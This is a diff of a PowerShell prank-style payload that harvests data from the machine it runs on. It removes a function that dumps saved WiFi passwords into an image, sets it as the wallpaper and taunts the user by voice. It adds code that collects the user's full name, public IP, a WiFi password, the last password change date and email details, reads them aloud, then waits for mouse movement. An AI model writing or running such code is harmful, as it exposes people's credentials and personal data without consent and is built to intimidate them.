@@ -77,65 +77,6 @@ function Get-Networks {
     return $WLANProfileObjects
 }
 
-function Set-WallPaper {
-    param (
-        [string]$Image,
-        [string]$Style = "Fill"
-    )
-    $WallpaperStyle = @{
-        "Fill" = 10
-        "Fit" = 6
-        "Stretch" = 2
-        "Tile" = 0
-        "Center" = 0
-        "Span" = 22
-    }[$Style]
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value ($Style -eq "Tile") -Force
-    Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-
-public class Params {
-    [DllImport("User32.dll", CharSet = CharSet.Unicode)]
-    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
-}
-"@
-    $SPI_SETDESKWALLPAPER = 0x0014
-    $UpdateIniFile = 0x01
-    $SendChangeEvent = 0x02
-    [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $UpdateIniFile -bor $SendChangeEvent)
-}
-
-function WallPaper-Troll {
-    if (!$Networks) { Write-Host "No networks detected" }
-    else {
-        $FileName = "$env:USERNAME-$(Get-Date -Format yyyy-MM-dd_hh-mm)_WiFi-PWD.txt"
-        $Networks | Out-File -FilePath "$Env:TEMP\$FileName"
-        $content = Get-Content "$Env:TEMP\$FileName"
-        $hiddenMessage = "`n`nMy crime is that of curiosity `nand yea curiosity killed the cat `nbut satisfaction brought him back `n with love -Jakoby"
-        $ImageName = "dont-be-suspicious.jpg"
-        Add-Type -AssemblyName System.Drawing
-        $bitmap = New-Object System.Drawing.Bitmap $w, $h
-        $font = New-Object System.Drawing.Font Consolas, 18
-        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphics.FillRectangle([System.Drawing.Brushes]::White, 0, 0, $bitmap.Width, $bitmap.Height)
-        $graphics.DrawString($content, $font, [System.Drawing.Brushes]::Black, 500, 100)
-        $graphics.Dispose()
-        $bitmap.Save("$Env:TEMP\foo.jpg")
-        $hiddenMessage | Out-File "$Env:TEMP\foo.txt"
-        cmd.exe /c copy /b "$Env:TEMP\foo.jpg" + "$Env:TEMP\foo.txt" "$Env:USERPROFILE\Desktop\$ImageName"
-        Remove-Item "$Env:TEMP\foo.txt", "$Env:TEMP\foo.jpg" -Force
-        $s.Speak("Wanna see something cool?")
-        Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName" -Style Center
-        $s.Speak("Look at all your passwords I got...")
-        Start-Sleep -Seconds 1
-        $s.Speak("These are the WiFi passwords for every network you've ever connected to!")
-        Start-Sleep -Seconds 1
-        $s.Speak("I could send them to myself but I won't")
-    }
-}
-
 function Get-Days_Set {
     try {
         $pls = (net user $env:UserName | Select-String -Pattern "Password last").ToString().Split("e")[1].Trim()
@@ -168,4 +109,28 @@ function Get-Email {
 
 # Gathering and speaking the collected information
 $fullName = Get-FullName
-$intro = "$full
+$intro = "$fullName, here's a quick overview of your PC."
+$ram = Get-RAM
+$pubIP = Get-PubIP
+$pass = Get-Pass
+$lastPasswordChange = Get-Days_Set
+$email = Get-Email
+$networks = Get-Networks
+
+$info = @(
+    "Your full name: $fullName",
+    "RAM Info: $ram",
+    "Public IP Address: $pubIP",
+    "WiFi Password: $pass",
+    "Last Password Change: $lastPasswordChange",
+    "Email Info: $email"
+)
+
+$s.Speak($intro)
+$s.Speak($info -join "`n")
+
+# Check for mouse movement and pause
+$originalMousePosition = [System.Windows.Forms.Cursor]::Position
+do {
+    Start-Sleep -Milliseconds 500
+} while ([System.Windows.Forms.Cursor]::Position -eq $originalMousePosition)
